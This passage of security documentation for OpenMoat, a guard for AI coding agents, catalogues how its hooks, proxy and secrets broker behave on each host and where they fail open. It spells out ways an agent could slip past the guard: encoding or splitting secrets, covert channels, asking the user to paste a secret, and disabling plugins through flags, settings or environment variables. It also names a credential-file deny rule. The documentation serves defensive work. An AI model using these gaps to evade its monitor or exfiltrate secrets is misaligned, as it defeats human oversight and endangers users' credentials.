- **The hook relay of `openmoat run` is attack surface (ADR-028).** Hooks inside the run's
  sandbox cannot open `~/.moat`, so they send each payload to the `openmoat run` process
  over the proxy's loopback port with the run's `MOAT_GUARD_TOKEN`, and that process
  decides with its own access. What it trusts and why:
  - *The token, for who may ask.* It is 256 bits, made per run and never written to
    disk, compared in constant time. A wrong one is recorded (`run-guard-token`) and
    gets no decision. As with the proxy credential, every process in the sandbox holds
    it and a same-user process that can read the agent's environment could take it.
    That is enough because what the token buys is small: a real decision on a payload
    the asker chose, recorded as such. Any process outside `openmoat run` gets the same by
    running `openmoat guard` itself. It cannot choose the verdict of a row, change the
    lock or the policy, read a secret source, or make taint looser: link rows only add
    sessions to the run, and taint only tightens.
  - *Nothing in the payload beyond what `openmoat guard` already trusts.* The payload,
    host, Continue flag and working directory are the hook's input, parsed and decided
    as outside `openmoat run`; each field has a size limit checked before it is read.
  - *The endpoint, for the hook.* The sandboxed guard trusts the reply only from the
    address in its environment, which its host set, and only when the reply repeats
    the request's random nonce and carries exit 0 or 2. `openmoat run` holds the port for
    the whole run and the sandbox lets nothing bind one, so a command in it cannot
    take the port over. A command can point a guard it starts itself at a server of its
    own, which then answers that guard. That gains nothing: the command could skip the
    guard altogether, a forged answer leaves no audit row, and the hooks the host
    starts keep the host's environment.
  - Everything that goes wrong denies in the sandboxed guard, and the sandbox stays
    closed to `~/.moat` (tested in `tests/e2e/run_guard.rs`).
- **The secrets broker (ADR-020) keeps a value from the agent, nothing more.**
  `openmoat-proxy` holds the value of each `secrets:` entry. It refuses and records
  (`proxy-secret`) any request to another host whose head, or plain-HTTP body, carries
  the placeholder or the value. It defends against a prompt-injected agent that sends
  the token it holds to a host of the attacker's choosing, or through an allowed relay.
  The agent only ever holds the placeholder. It does not defend against:
  - an agent that reads the source itself (a file or variable no deny rule covers;
    `openmoat policy lint` warns);
  - the value encoded (base64, percent-encoding, compression) or split across requests,
    since the check matches exact bytes;
  - anything inside a CONNECT tunnel, which is TLS and is not decrypted;
  - an observer on the network path of a plain-HTTP request to the owner host. The proxy
    injects the value there in clear text, but only for a secret that opts in with
    `plain_http: true`, which `openmoat policy lint` flags for any host off this machine;
  - covert channels such as timing, or data hidden in requests to the owner host;
  - before the proxy: `openmoat guard` denies a placeholder in a URL, web search or
    connecting command's arguments to another host (`placeholder-egress`), but not one
    in a file, a here-document, an environment variable or an encoded form;
  - an agent that asks the user to paste the secret into the conversation;
  - the owner host itself misusing or reflecting the token;
  - traffic that does not go through `openmoat proxy`: the agent's own requests and
    in-process tools; every host sandbox command unless the policy sets
    `sandbox.proxy_port`; and even then, under Codex, every command whose Codex was
    started without `HTTP(S)_PROXY` naming it (ARCHITECTURE.md §13).
- **By default the host sandboxes' own proxies decide network.** The default is no
  `sandbox.proxy_port`. Claude Code's and Codex's proxies then enforce the policy's
  domain names, with no direct route out. They do not write OpenMoat's audit log and
  decide only by domain name; only Claude Code's injects brokered secrets (next item),
  Codex's does not. Claude Code still refuses local addresses through its own check;
  Codex refuses link-local and private ones.
- **Claude Code's mask mode is Claude Code's broker, not OpenMoat's.** For each
  `secrets:` entry with an `env` or `file` source whose host is in `net` allow,
  `openmoat sandbox sync` writes a `sandbox.credentials` `mask` entry limited to that host
  and turns on `network.tlsTerminate`, which Claude Code needs for masking and calls
  experimental ([sandboxing](https://code.claude.com/docs/en/sandboxing#mask-credentials)).
  Sandboxed commands then hold a placeholder and Claude Code's proxy, which now
  terminates their TLS, sends the value to that host. OpenMoat does not see or record
  those requests, and Claude Code's proxy adds no content filtering. A `keychain`
  source, a host outside `net` allow, and a `plain_http` secret (which goes to one port
  only, while Claude Code's broker would inject it on every port) are not masked; they keep the hook's and `openmoat proxy`'s handling. On macOS a `file`
  source is denied, not masked. `openmoat doctor` reports each secret's state and flags a
  hand-set `credentials.allowPlaintextInject`.
- **With `sandbox.proxy_port`, host sandbox network depends on a running `openmoat proxy`.**
  - Claude Code's sandboxed commands reach the network only through it. While it is
    stopped they have none, and `openmoat doctor` and `openmoat status` warn; nothing falls
    back to direct network.
  - Programs that speak only SOCKS5 have no network at all.
  - Codex's proxy hands what it allows to `openmoat proxy` only when Codex runs with
    `HTTP(S)_PROXY` naming it, which `config.toml` cannot set.
  - Codex's own API requests then go through `openmoat proxy` too. Its API hosts
    (`api.openai.com`, `chatgpt.com`) need a `fetch` allow rule, or Codex cannot reach
    its model.
- **An allowed host can front for another site on the same provider.** `openmoat proxy`
  checks the cleartext TLS server name against the CONNECT host and refuses an
  encrypted one (ECH, unless `sandbox.proxy_allow_ech`), but it does not see the HTTP
  `Host` header inside the tunnel, which some CDNs still route by.
- **Connections refused at accept are counted, not listed.** A `503` before the
  request is read has no host to record; `openmoat proxy` writes one `proxy-capacity`
  row at once and then one per 10 seconds with the count, written when the next
  connection arrives after that time, so the count of a burst's end can be missing
  until then.
- **When the hook fails, most hosts run the call.** The host rows below come from
  each host's documentation or source as of 2026-10-07 ([Claude Code hooks][cc-hooks],
  [Codex hooks][codex-hooks] and [`pre_tool_use.rs`][codex-pre],
  [`command_runner.rs`][codex-runner], [Cursor hooks][cursor-hooks], the OpenClaw
  [hook reference][openclaw-hooks] (2026.10.5) and OpenMoat's own OpenClaw plugin
  (`crates/openmoat-hosts/src/host/openclaw/integration/openmoat.mjs`), Continue
  [`hookRunner.ts`][cn-runner], and for Gemini CLI its [hooks reference][gemini-hooks]
  and `packages/core/src/hooks/hookRunner.ts` of `@google/gemini-cli` 0.65.0, checked
  2026-10-20, and for Hermes Agent [`agent/shell_hooks.py`][hermes-hooks] and
  `hermes_cli/plugins.py` of v0.22.5, checked 2026-10-25); *unverified* marks what the source does not state,
  and the OpenClaw column is *unverified* against a running Gateway. OpenClaw has no
  command hook: its "hook" is OpenMoat's plugin, which runs `openmoat guard` and turns the
  outcome into OpenClaw's answer. The rows marked "ours" are tested end to end with
  the real binary (`crates/openmoat-cli/tests/e2e/host_failures.rs`), and
  each host's `HostSpec` (`on_hook_failure`, and `gaps` for its `known gaps` line, in
  `crates/openmoat-hosts/src/host/<id>.rs`) repeats the host rows.

  | Case | Claude Code | Codex | Cursor | OpenClaw | Gemini CLI | Hermes Agent | Continue CLI |
  |---|---|---|---|---|---|---|---|
  | Hook binary missing or cannot start | 2.1.295 and later: blocks, `openmoat init` sets `onFailure: "block"` on `PreToolUse`; before: runs the call | runs the call | blocks: `openmoat init` sets `failClosed` (*unverified* for a missing binary; Cursor runs a shell string, which exits 127) | blocks: the plugin blocks when `openmoat` is missing or cannot start | blocks: bash exits 127 with a message; on Windows the entry exits 2 when PowerShell cannot run `openmoat` (*unverified*) | blocks: `openmoat init` sets `fail_closed: true`, and a command that cannot start fails closed | runs the call |
  | Hook crashes or exits non-zero, not 2, without output | 2.1.295 and later: blocks (`onFailure`); before: runs the call | runs the call | blocks (`failClosed`) | blocks (the plugin); a plugin handler that throws is blocked by OpenClaw | runs the call; with output, any exit but 0 and 1 blocks, and a killed hook counts as exit 0 | blocks (`fail_closed`: a non-zero exit with no decision) | runs the call |
  | Hook times out | 2.1.295 and later: blocks (`onFailure`); before: runs the call | runs the call | blocks (`failClosed`) | blocks: the plugin after 45 s without an answer, OpenClaw when the handler outlasts its timeout | runs the call: Gemini CLI has no fail-closed setting | blocks (`fail_closed`); so does `plugins.hook_callback_timeout` (30 s by default) running out | runs the call (a killed hook counts as exit 0) |
  | Timeout: host default / set by `openmoat init` | 600 s / 600 s (`ConfigChange` 60 s) | 600 s / 600 s | not documented (*unverified*) / 600 s | 15 s / 60 s (`plugins.entries.openmoat.hooks.timeouts.before_tool_call`; OpenClaw accepts up to 600 s) | 60 s / 600 s (in milliseconds in `settings.json`) | 60 s / 60 s (Hermes clamps a longer one to 300 s; `plugins.hook_callback_timeout` bounds it too) | 600 s / 600 s (Claude Code's entry) |
  | Hook prints no or malformed JSON, exit 0 | runs the call | runs the call | blocks (permission hooks) | no output: no decision (a `defer`), OpenClaw's own checks decide; malformed: blocks (the plugin) | no output: no decision (a `defer`), Gemini CLI's own policy decides; malformed: runs the call, the text shown as a message | no output or `{}`: no decision (a `defer`), Hermes's own checks decide; not a JSON object: blocks (`fail_closed`) | runs the call |
  | Exit 2 | blocks | blocks when stderr is not empty | blocks | blocks (the plugin; with or without a readable deny) | blocks when it prints something (stdout, else stderr, is the reason); silent, runs the call | blocks (the reason from a `block` on stdout, else stderr) | blocks |
  | Ours: malformed or truncated payload, unknown event | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 |
  | Ours: tool OpenMoat does not know | defer (no output: Claude Code's own prompt and rules decide), rule `ungoverned`, recorded | as Claude Code | a tool naming a path is checked as writing it (reading it only for Cursor's listing and search tools); otherwise `tool.unknown` with whatever else its arguments name (paths and URLs by their look, commands), which asks (sent as a deny) | every tool reaches the plugin; one OpenMoat does not know is `tool.unknown` together with the paths, URLs and commands its arguments name (POLICY.md §6), which defers when they name nothing denied | every tool reaches the hook (matcher `*`); one OpenMoat does not know is `tool.unknown` with what its arguments name, as OpenClaw's; its to-do, tracker, plan, skill and subagent tools are `ungoverned` | every tool reaches the hook (no matcher); one OpenMoat does not know is `tool.unknown` with what its arguments name, as OpenClaw's; its to-do, clarify, session-search, skill-list and subagent tools are `ungoverned` | as Claude Code |
  | Ours: no decision within 30 s (`GUARD_BUDGET_S`) | deny, exit 2; listed in `~/.moat/guard-hangs.log`, not the audit log | same | same | same | same | same | same |
  | Ours: hook missing, out of date or naming a binary that does not exist | `openmoat status` and `openmoat doctor`: `not protected` | same | same, and an entry without `failClosed: true` | same (the plugin file and its `openclaw.json` entries); a plugin that has not reported loading since it was written or OpenClaw changed is a note (ADR-042) | same | same, and a hook its `shell-hooks-allowlist.json` does not approve or an entry without `fail_closed: true` | not applicable: `cn` fires no hooks (below) |

  What `openmoat status` and `openmoat doctor` print as each host's `known gaps`, and what the
  host does when its hook fails, generated from its `HostSpec` (`gaps`,
  `on_hook_failure`; `OPENMOAT_TEST_UPDATE_DOCS=1 cargo test -p openmoat-hosts --test
  docs`); do not edit the list:

  <!-- generated:hosts-gaps -->
  - **Claude Code.** Known gaps: file tools, WebFetch and MCP servers run outside the OS sandbox; before Claude Code 2.1.295 calls run unchecked if the hook binary is missing or crashes. When the hook fails: before 2.1.295 runs the call when the hook is missing, cannot start, exits non-zero other than 2, or times out (default 600 s); from 2.1.295 blocks it (`openmoat init` sets `onFailure: "block"`).
  - **Codex.** Known gaps: web search and hosted tools are not hooked; asks become denies; Codex skips a new or changed hook until the person trusts it in `/hooks`, and `[features] hooks = false` turns hooks off (`openmoat status` and `doctor` report that); calls run unchecked if the hook binary is missing or crashes. When the hook fails: runs the call when the hook is missing, cannot start, exits non-zero other than 2 (or 2 with nothing on stderr), or times out (default 600 s).
  - **Cursor.** Known gaps: commands Cursor runs outside its sandbox (a rerun or call its Auto-review classifier approves, Run Everything mode, the CLI without `--sandbox enabled`) are not confined; file-tool asks become denies; Task and tools that name no path are not hooked; a failed hook blocks the call. When the hook fails: runs the call when the hook is missing, crashes or times out, unless the hook entry sets `failClosed: true`; then it blocks the call.
  - **OpenClaw.** Known gaps: no OS sandbox from OpenMoat; parameters another plugin changes are undone, except where that plugin also asks for approval (OpenClaw then keeps the parameters the person approved) or runs after OpenMoat's last handler, at the same lowest priority or a lower one (`-Infinity`); OpenClaw's process input is not checked; calls run unchecked if the Gateway does not load the plugin (`openmoat status` and `doctor` say when it has not reported loading since it or OpenClaw changed); a failed or slow hook blocks the call. When the hook fails: blocks the call when OpenMoat's plugin throws or times out (OpenClaw's `before_tool_call` fails closed), and the plugin blocks when `openmoat` is missing, crashes or does not answer; runs the call unchecked when the Gateway does not load the plugin (a load error leaves the plugin `status: "error"` and the Gateway running).
  - **GitHub Copilot CLI.** Known gaps: a hook that times out lets the call run; `disableAllHooks` in Copilot's user or a repository's `settings.json` turns the hook off (`openmoat status` and `doctor` report it); MCP tools are told apart from built-in ones only by name, so a changed server is traced by its `<server>-` prefix; asks become denies in autopilot; no OS sandbox is configured. When the hook fails: blocks the call when the hook cannot start, crashes or exits non-zero; runs it when the hook times out (`timeoutSec`, 600 s as `openmoat init` writes it) or its file is gone.
  - **pi.** Known gaps: no OS sandbox from OpenMoat; pi has no approval step of its own, so a call OpenMoat defers runs; an input change by an extension pi loads after OpenMoat's (a package's) and an extension that replaces a built-in tool are not checked; a trusted project's `.pi` settings and extensions load with the agent's rights; calls run unchecked if pi does not load the extension (`openmoat status` and `doctor` report a settings entry that turns it off, and a session pi wrote since the extension or pi changed without the extension reporting that it loaded); a failed or slow hook blocks the call. When the hook fails: blocks the call when OpenMoat's extension throws (pi's `tool_call` fails closed), and the extension blocks when `openmoat` is missing, crashes or does not answer within 45 s; runs the call unchecked when pi does not load the extension (`--no-extensions`, or an `extensions` entry in pi's or a trusted project's settings that turns it off).
  - **Gemini CLI.** Known gaps: no OS sandbox from OpenMoat; in a folder Gemini CLI does not trust it runs no settings hooks at all and asks the person before every tool instead; a project's `.gemini/settings.json` can turn hooks off or add a hook that rewrites a call's arguments (`openmoat status` and `doctor` warn about one); extension hooks run beside OpenMoat's; a hook that times out lets the call run. When the hook fails: runs the call when the hook times out, is killed by a signal or exits 1 (Gemini CLI has no fail-closed setting); blocks it when the hook exits 2, or exits with any other code and prints something, as a missing `openmoat` does.
  - **OpenCode.** Known gaps: no OS sandbox from OpenMoat; OpenCode 1 plugins cannot ask, so an ask is a deny that says how to approve it; OpenCode before 1.3.4 is not supported; other plugins and custom tools run in OpenCode's process with the agent's rights, and a project's load at start with no prompt; a project's `-openmoat` turns OpenMoat off in OpenCode 2; OpenCode 2's `--auto` approves OpenMoat's asks; the person's `!` shell commands are not checked; calls run unchecked if OpenCode does not load the plugin (`--pure`, `OPENCODE_PURE`, a load error; `openmoat status` and `doctor` say when it has not reported loading since it or OpenCode changed); a failed or slow hook blocks the call. When the hook fails: blocks the call when OpenMoat's plugin throws (OpenCode's `tool.execute.before` and `execute.before` fail closed), and the plugin blocks when `openmoat` is missing, crashes or does not answer within 45 s; runs the call unchecked when OpenCode does not load the plugin (OpenCode 1's `--pure` or `OPENCODE_PURE`, OpenCode 2's `-openmoat` in `plugins`, or an error loading it).
  - **Hermes Agent.** Known gaps: no OS sandbox from OpenMoat; what an `execute_code` script does itself is not checked (its tool calls are); a plugin, another hook's `modify` or tool middleware can rewrite a call's arguments after the check; terminal commands on a remote backend (docker, ssh, modal, …) are checked as local ones; the in-session `/yolo` toggle and `hermes -z` approve an ask unseen without OpenMoat seeing it; relative paths are checked against the Hermes process's directory, not the session's; another profile, or `HERMES_SAFE_MODE=1`, runs without the hook; an internal error in Hermes's hook dispatcher runs the call unchecked; a changed `config.yaml` is caught on the next call. When the hook fails: blocks the call when the hook cannot start, times out, exits non-zero without a decision or prints something that is not JSON (`fail_closed: true`, which `openmoat init` sets), and when it has not answered within `plugins.hook_callback_timeout` (30 s by default); runs every call unchecked when the hook is not registered: missing from `config.yaml` or from `shell-hooks-allowlist.json` in a gateway, cron or ACP session, another profile, or `HERMES_SAFE_MODE=1`; runs a call unchecked when Hermes's own hook dispatcher raises an error, which it catches and proceeds past.
  - **Continue CLI.** Known gaps: the released Continue CLI does not run hooks, so OpenMoat cannot check its tool calls; run it under `openmoat run`. When the hook fails: runs the call when the hook is missing, cannot start, exits non-zero other than 2, or times out (default 600 s).
  <!-- /generated -->

  An OpenClaw `ask` becomes OpenClaw's approval request, which OpenClaw blocks when no
  one can answer it (no approval route, timeout).
  **OpenClaw runs every call unchecked when the Gateway does not load the plugin**
  (a plugin OpenClaw must load or refuse to run is tracked upstream in
  [openclaw/openclaw#147129](https://github.com/openclaw/openclaw/issues/147129)):
  `plugins.enabled: false`, `openmoat` in `plugins.deny` or missing from
  `plugins.allow`, the file or its `plugins.load.paths` entry removed, or a Gateway
  started with an `OPENCLAW_HOME`, `OPENCLAW_STATE_DIR` or `OPENCLAW_CONFIG_PATH` that
  names another configuration than the one `openmoat init` set up (`openmoat doctor` reports a
  shell whose variables disagree with the record; it cannot see the Gateway's). `moat
  init` refuses `plugins.enabled: false` and fixes the allow and deny lists;
  `kernel-self` denies the agent writes to `openclaw.json` (where it is), the plugin and
  the state directory, and the lock pins both files, so a change is caught on the next
  call the plugin sends, not when the Gateway reloads. Files an `$include` in
  `openclaw.json` merges in are not pinned. OpenClaw versions before 2026.5.6 skip the
  hook for skill commands ([CVE-2026-53845][cve-2026-53845], GHSA-68xw-r643-9p5w).
  A plugin that fails to load (a syntax error, an API OpenClaw dropped, a broken Node)
  is recorded with `status: "error"` and the Gateway starts without it; with no
  `before_tool_call` handler OpenClaw runs every call. The plugin therefore reports
  loading (`openmoat guard --heartbeat --host openclaw`, ADR-042), and `openmoat status`
  and `openmoat doctor` say "plugin not loaded yet" until it has reported, or sent a
  call, since `openmoat init` wrote it or the `openclaw` on the search path changed.
  OpenClaw keeps its sessions in a database its sign-in commands write too, so OpenMoat
  cannot tell a Gateway that ran without the plugin from one that has not run: for
  OpenClaw this stays a note, not "not protected". The report is information, not a
  check: an agent that already runs unchecked could forge one.
- **Gemini CLI: what its hook leaves open.** Gemini CLI has no fail-closed setting, so
  a `BeforeTool` hook that times out or is killed lets the call run; `guard` denies on
  its own after 30 s, well inside the 600 s `openmoat init` sets. Gemini CLI runs no
  settings hooks at all in a folder it does not trust (OpenMoat's included), and asks
  the person before every tool there instead. A project's `.gemini/settings.json` is
  merged over the user file in a trusted folder: it can set `hooksConfig.enabled: false`
  or name OpenMoat's entry in `hooksConfig.disabled`, and its own `BeforeTool` hooks
  run beside OpenMoat's and may rewrite a call's arguments (`hookSpecificOutput.tool_input`)
  after OpenMoat decided them; extension hooks can do the same. `kernel-self` denies the
  agent writing that file, the user file and the trust list, but a cloned repository
  can ship one: `openmoat status` and `openmoat doctor` warn about a project file that
  turns hooks off, adds hooks, sets a tool discovery command or starts MCP servers, and
  report Gemini CLI as not protected while the user file turns OpenMoat's hook off
  (which `openmoat init` pins as it finds it). `allow` skips none of Gemini CLI's
  own confirmations; an `ask` makes Gemini CLI confirm even where its policy or YOLO
  mode would not. Its to-do, tracker, plan-mode and skill tools are not checked, nor a
  subagent invocation (the subagent's own tool calls are: a tool OpenMoat does not
  know, a browser subagent's navigation included, is checked for the paths, URLs and
  commands its arguments name). `web_fetch` names its URLs
  inside a prompt; one is checked as a `fetch`, and a prompt with several is refused.
  `read_mcp_resource` names no server, so a URI other than `file:` is `tool.unknown`.
  `run_shell_command` runs in its `dir_path`, which the model chooses: it is checked
  as a `cd` there before the command, and the project stays the one of the session's
  directory, so a `dir_path` never makes a directory the project. Without a
  `dir_path`, `grep_search` and `glob` search every directory of Gemini CLI's
  workspace, as `read_many_files` always does, and the hook payload names only the
  working directory: those calls ask (`unchecked`), Gemini CLI's own confirmation.
  The lock pins `~/.gemini/settings.json`, which Gemini CLI writes itself when the
  person picks a model, a theme, a sign-in method or a display setting; a change of
  only those keys is reported while calls are still decided, and any other change
  denies every call (`kernel-integrity`) until `openmoat doctor --accept` (below,
  "Some agent settings may drift"). There is no OS sandbox
  from OpenMoat for Gemini CLI; its own `--sandbox` (Seatbelt or a container) is the
  person's choice, or run it under `openmoat run`.
- **Hermes Agent: what its hook leaves open.** Hermes runs a `pre_tool_call` shell hook
  only while its exact command is approved in `shell-hooks-allowlist.json`; its gateway,
  cron, ACP and `mcp-serve` sessions skip an unapproved one with a log line and run
  every call unchecked. `openmoat init` writes that approval, the lock pins the file, and
  `openmoat status` and `openmoat doctor` report a hook it does not approve. With
  `fail_closed: true`, which `openmoat init` sets, a hook that cannot start, times out,
  exits non-zero without a decision or prints something that is not a JSON object
  blocks the call; Hermes reads any other value of the key as `false`, and `openmoat
  status` and `openmoat doctor` report OpenMoat's entry without it as not protected.
  Hermes runs the shell hook as a plugin callback under `plugins.hook_callback_timeout`
  (30 s by default), after which it blocks the call: the limit that ends first, equal to
  the guard's own 30 s budget, so a slow call is blocked by one or the other. Hermes's
  own dispatcher still lets a call run when it raises an exception itself
  (`_pre_dispatch_guards` in `model_tools.py` and `_pre_tool_block` in
  `agent/tool_executor.py` catch it and go on), which takes a Hermes bug and which no
  hook can see. `HERMES_SAFE_MODE=1`, Hermes's private
  safe-worker mode and every profile other than the one `openmoat init` set up run no
  OpenMoat hook; `kernel-self` denies the agent setting `HERMES_SAFE_MODE`, writing the
  home's `config.yaml`, allowlist, `.env`, `active_profile`, plugins and hooks, and
  running `hermes config set hooks…`/`approvals…`/`plugins…`/`HERMES_SAFE_MODE`, `hermes hooks revoke` and
  `hermes profile use`, and `runs-later` asks before writes to another profile's files.
  A changed `config.yaml` is caught on the next call (Hermes has no settings-change hook,
  and a gateway drops a removed hook within about 30 s); the lock pins it without
  `mcp_servers` and the keys Hermes rewrites for a person's choice (`model`, `display`,
  `_config_version`), so any other change denies every call. Plugins, gateway hooks,
  another shell hook's `modify` reply and Hermes's tool middleware run in its process and
  can rewrite a call's arguments after OpenMoat decided; what an `execute_code` script
  does itself (file, process and network calls from Python) is not checked, though each
  tool it calls fires the hook; terminal commands on a remote backend (docker, ssh,
  modal, daytona, singularity, vercel) are checked as local ones. The payload's `cwd` is
  the Hermes process's directory, not the session's (which a `cd` in an earlier terminal
  call, or a Desktop, TUI or ACP workspace, moves): a file tool's relative path asks
  (`unchecked`), and a terminal command's relative paths are checked against the
  process's directory. An `ask` becomes Hermes's own approval request, which blocks with
  no person there; Hermes approves it unseen in YOLO mode, with `approvals.mode: off` and
  in cron, single-query or unattended sessions set to `approve`, so where OpenMoat sees
  one of those (`HERMES_YOLO_MODE` in the hook's environment, the settings in
  `config.yaml`) the ask is a deny; the in-session `/yolo` toggle and `hermes -z` are not
  visible to the hook. There is no OS sandbox from OpenMoat for Hermes Agent; run it under
  `openmoat run`, or set its `terminal.backend` to a container.
- **OpenClaw tools OpenMoat does not check.** OpenClaw runs `before_tool_call`
  handlers highest priority first, gives each the call as it came, and runs the
  `params` of the last handler that returns some; a block is final, and the first
  approval request fixes the parameters (`runBeforeToolCall`, `src/plugins/hooks.ts`).
  OpenMoat's plugin decides at the highest priority and returns the parameters it
  decided on at the lowest (ADR-041), so another plugin's change is undone and the call
  that runs is the one OpenMoat checked. Two cases remain, as OpenClaw gives a plugin no
  way to see the merged result: a plugin that changes the call and asks for approval in
  the same answer keeps its change once a person approves its request (unchecked by
  OpenMoat), and a plugin registered at the same lowest priority after OpenMoat's, or at
  a lower one (`-Infinity`), runs after it. A change another plugin meant is undone too. Plugins run inside the Gateway
  with its rights and can change what any code there does. `process` input to a running `exec` session and Code Mode `exec`
  are `unparseable`, so they are left to OpenClaw; so is `exec` on Windows
  (PowerShell), and `nodes` `invoke`, which runs a command on a paired device, where
  no rule of this machine applies. Other `nodes` actions that act on a device (camera,
  screen, location, notifications, pairing approval) and `cron` `run`, `remove` and
  `wake` are `tool.unknown`, as are `message`, `sessions_*`, `subagents` and other
  plugins' tools: left to OpenClaw by the default policy, after what a plugin tool's
  arguments name (paths, URLs, commands) is checked. `exec` runs in its `workdir`,
  checked as a `cd` there before the command; the project stays the session's
  workspace. A `cron` job added or
  updated asks (`runs-later`): the Gateway runs it later, a command job directly in
  its own process, which no hook sees; what the job will do is not checked.
  `code_execution` runs at the model provider and is not checked. A defer leaves
  `read`, `write` and `edit` to OpenClaw, which does not ask for them. OpenClaw's MCP
  servers (`mcp.servers` in `openclaw.json`) are pinned one by one (ADR-026); servers
  a plugin bundle brings in its own `.mcp.json` are not, and an `$include` where
  servers may come from holds back every OpenClaw MCP call. There is no OS sandbox
  from OpenMoat for OpenClaw; run the Gateway under `openmoat run` for one.
- **pi, when its hook fails.** pi has no command hook either: its "hook" is
  OpenMoat's extension (`crates/openmoat-hosts/src/host/pi/integration/openmoat.js`, written to
  `<agent dir>/extensions/openmoat.js`), which runs `openmoat guard` from pi's
  `tool_call` event. From pi 1.3.0's documentation and source (`docs/extensions.md`,
  "Errors and cleanup"; `dist/core/agent-session.js`), *unverified* against a running
  pi: a handler that throws blocks the call, and pi waits for a handler without a
  limit. The extension blocks when `openmoat` is missing or cannot start, crashes,
  exits other than 0 or 2, answers what it cannot read, or gives no answer within
  45 s; no output on exit 0 is no decision (a `defer`), and pi, which has no
  approval step, runs the call. An `ask` is pi's confirmation dialog where pi has a
  screen (the terminal UI, RPC mode); in print and JSON mode it reaches pi as a deny
  that says how to approve it. **pi runs every call unchecked when it does not load
  the extension**: `pi --no-extensions` (`-ne`), an `extensions` entry in pi's
  `settings.json` that turns it off (`-extensions/openmoat.js`, or a `!` glob), the
  same in a trusted project's `.pi/settings.json`, which pi resolves first, or a pi
  started with a `PI_CODING_AGENT_DIR` other than the one `openmoat init` set up.
  `kernel-self` denies the agent writes to the extension, its directory, pi's
  `settings.json` and `trust.json` (wherever `PI_CODING_AGENT_DIR` puts them), and
  the lock pins the extension, so an edit of it stops every call. Under `openmoat run`
  the sandbox denies those writes to pi itself too, so pi cannot save its settings or
  a trust decision there. A project's
  `.pi/settings.json`, `.pi/extensions/` and `.pi/mcp.json` ask (`runs-later`).
  An extension that fails to load is a diagnostic and the session starts without it.
  The extension reports loading (`openmoat guard --heartbeat --host pi`, ADR-042):
  `openmoat status` and `openmoat doctor` say "plugin not loaded yet", a note, until it
  has reported or sent a call since `openmoat init` wrote it or the `pi` on the search
  path changed, and once pi has written a session since without either (pi with
  `--no-extensions`, or an extension that failed), they warn and report pi as not
  protected.
- **pi tools OpenMoat does not check.** pi runs `tool_call` handlers in extension
  load order and lets each change the call's input; an extension loaded after
  OpenMoat's (a pi package, a built-in extension) can change it after OpenMoat saw
  it, and an extension can register a tool under a built-in's name (`read`,
  `bash`), which OpenMoat then checks as the built-in. Extensions, including a
  trusted project's, run inside pi with the agent's rights. `codemode` scripts run in
  QuickJS without files or network; each tool a script calls is checked as its own
  call. An extension's own tool is `tool.unknown`, which the default policy defers
  and pi then runs: so its input is checked for every path and URL it names, by key
  or by look, and every command under a command key (POLICY.md §6), and a tool naming
  `~/.ssh/id_rsa` is denied. A tool that names what OpenMoat cannot recognise (a
  relative file name under a key it does not know) still runs unchecked. The MCP servers in pi's `mcp.json` and a project's `.pi/mcp.json` are pinned
  like every host's (ADR-026): a changed or new one holds back its own tool calls
  (`mcp__<server>__…`, the name as pi spells it) until a person accepts it. An
  `extensions` entry in pi's `settings.json` that excludes OpenMoat's extension
  (`-extensions/openmoat.js`, `!*.js`) makes `openmoat status` and `openmoat doctor`
  report pi as not protected, and one in a project's `.pi/settings.json`, or an
  extension in its `.pi/extensions/`, is warned about; `pi --no-extensions` is seen
  only afterwards, as a session written without the extension reporting (above). The
  extension does not freeze the input it checked, as OpenCode's plugin does: pi
  documents changing it as a feature, and a frozen input would block every call another
  extension changes. There is no OS sandbox from OpenMoat for pi;
  run pi under `openmoat run` for one.
- **OpenCode, when its hook fails.** OpenCode has no command hook either: its "hook"
  is OpenMoat's plugin (`crates/openmoat-hosts/src/host/opencode/integration/openmoat.js`,
  written to `plugins/openmoat.js` in `~/.config/opencode`, `$XDG_CONFIG_HOME/opencode`
  or `OPENCODE_CONFIG_DIR`), one file that OpenCode 1 (1.3.4 and later) loads through
  `server` and OpenCode 2 through `setup` (ADR-040), and which runs `openmoat guard` from
  OpenCode 1's `tool.execute.before` or OpenCode 2's `execute.before`. From the OpenCode
  1.19.4 source (`plugin/index.ts` `trigger`, `session/tools.ts`, `session/processor.ts`)
  and the 2.2.0 source (`core/src/plugin/hooks.ts`, `core/src/tool.ts`,
  `plugin/src/promise/adapter.ts`), *unverified* against a running OpenCode: a handler
  that throws blocks the call and the model sees the error (OpenCode 2.0.x: the call
  stops with an error of its own), and OpenCode waits for a handler without a limit or
  an abort signal. The plugin blocks when `openmoat` is missing or cannot start,
  crashes, exits other than 0 or 2, answers what it cannot read, or gives no answer
  within 45 s; no output on exit 0 is no decision (a `defer`), and OpenCode's own
  permission rules decide, which allow most tools by default. OpenCode 1 gives a plugin
  no way to ask the person (its `permission.ask` hook is declared but not called since
  1.3.0), so an `ask` reaches it as a deny that says how to approve it; on OpenCode 2
  the plugin asks through `ctx.permission.assert` and forces the answer to be asked
  (an `evaluate` hook), and a configured deny, a rejection or a client that cannot ask
  (`opencode run` without `--auto`) blocks the call, while `--auto` (`--yolo`,
  `--dangerously-skip-permissions`) approves it unseen and the plugin cannot tell.
  **OpenCode runs every call unchecked when it does not load the plugin**: OpenCode 1's
  `opencode --pure` or `OPENCODE_PURE=1` (no external plugins), OpenCode 2's
  `-openmoat` or `-*` in a configuration's `plugins` (or the old `plugin`), or a
  `policies` entry denying `integration.use` of the plugin, an error while the plugin
  loads (OpenCode logs it and goes on), an OpenCode started with another
  `XDG_CONFIG_HOME`, `OPENCODE_CONFIG_DIR` or `HOME` than the one `openmoat init` set up,
  and OpenCode before 1.3.4, which loads no object plugin. `kernel-self` denies the
  agent writes to the plugin, its folders, the directory, the global configuration
  files (whose plugin list loads plugins and can remove OpenMoat's), OpenCode 2's
  background service settings (`service*.json`) and `~/.opencode`, and denies
  `opencode … --pure`, setting `OPENCODE_PURE`, `OPENCODE_CONFIG_DIR`, `OPENCODE_CONFIG`
  or `OPENCODE_CONFIG_CONTENT`, `opencode upgrade --major`, `opencode plugin --global`,
  OpenCode 2's `opencode plugin add|remove|update` and `opencode service set|unset`;
  writing a project's configuration asks (`runs-later`); the lock pins the plugin, so
  an edit of it stops every call. `openmoat status` and `openmoat doctor` report
  OpenCode as not protected while the person's own `opencode.json[c]` removes the
  plugin, and warn about a removal in the configuration of the directory they run in
  and its project root (not of the parent directories OpenCode 2 also reads). The lock
  does not pin OpenCode's configuration files: a removed plugin calls no guard, so a
  pin would stop nothing in OpenCode, and OpenCode rewrites its global file itself.
